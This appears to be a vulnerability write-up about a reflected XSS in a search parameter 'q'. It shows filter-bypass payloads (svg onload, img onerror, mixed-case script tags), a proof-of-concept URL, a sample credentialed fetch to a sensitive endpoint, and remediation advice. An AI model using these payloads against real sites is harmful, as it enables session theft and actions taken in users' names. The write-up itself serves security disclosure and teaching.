# 🔥 Advanced Reflected XSS with Filter Bypass and Real Impact

## 🧠 Summary

A reflected XSS vulnerability was discovered in a search parameter. While basic filtering was implemented, it was possible to bypass protections using alternative HTML vectors, leading to execution of arbitrary JavaScript in the victim’s browser.

---

## 🎯 Target

Search functionality

---

## 🔍 Reconnaissance

Intercepted request:

GET /search?q=test

The parameter `q` is reflected in the response HTML.

---

## ⚠️ Filter Behavior

* `<script>` tags are filtered ❌
* Some special characters are encoded

---

## 🧪 Bypass Techniques

### 1. Alternative Tag Injection

Payload:
<svg/onload=alert(1)>

✅ Successfully executed

---

### 2. Event Handler Injection

Payload: <img src=x onerror=alert(1)>

✅ Executed due to lack of proper attribute sanitization

---

### 3. Case Variation / Obfuscation

Payload:

<ScRiPt>alert(1)</ScRiPt>

⚠️ Inconsistent filtering observed

---

## 🧪 Proof of Concept (PoC)

1. Visit:
   /search?q=test

2. Inject payload:
   /search?q=<img src=x onerror=alert(1)>

3. JavaScript executes in victim’s browser

---

## 💥 Real Impact Scenario

This XSS can be leveraged to:

* Steal sensitive session data (if cookies are accessible)
* Perform actions on behalf of the user
* Deliver phishing content inside trusted pages

Example (conceptual):

<script>
fetch('/sensitive-endpoint', {credentials: 'include'})
</script>

---

## 🛡️ Recommendation

* Use proper output encoding based on context
* Sanitize user input strictly
* Implement Content Security Policy (CSP)
* Avoid reflecting raw user input

---

## 🧠 Methodology Insight

Steps followed:

* Identified reflection points
* Tested basic payloads
* Observed filtering behavior
* Crafted alternative payloads
* Verified execution and impact

---

## ✅ Conclusion

The application attempts to filter XSS but fails to handle alternative payloads and event-based injections, leading to successful exploitation. Proper output encoding is required to mitigate this issue.
